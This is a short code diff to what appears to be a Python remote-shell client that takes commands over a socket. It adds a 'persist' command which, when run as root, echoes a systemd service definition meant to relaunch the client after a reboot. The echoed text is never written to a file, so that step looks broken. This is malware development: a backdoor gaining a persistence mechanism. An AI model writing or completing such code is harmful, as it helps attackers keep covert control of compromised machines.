@@ -44,11 +44,21 @@ def shell():
         elif command == "quit":
             sock.close()
             break
+        elif command == "persist":
+            try:
+                if os.geteuid() == 0:
+                    os.system("echo -e '[Unit]\n   [Service]\nType=simple\nExecStartPre=/bin/sleep "
+                              "30\nExecStart=/usr/bin/python /home/kris/Download/entangled-master/client.py'")
+                else:
+                    print("I am not root")
+            except AttributeError as a:
+                continue
+
 
         elif command[:2] == 'cd' and len(command) > 1:
             try:
                 os.chdir(command[3:])
-            except:
+            except :
                 continue
 
         else:
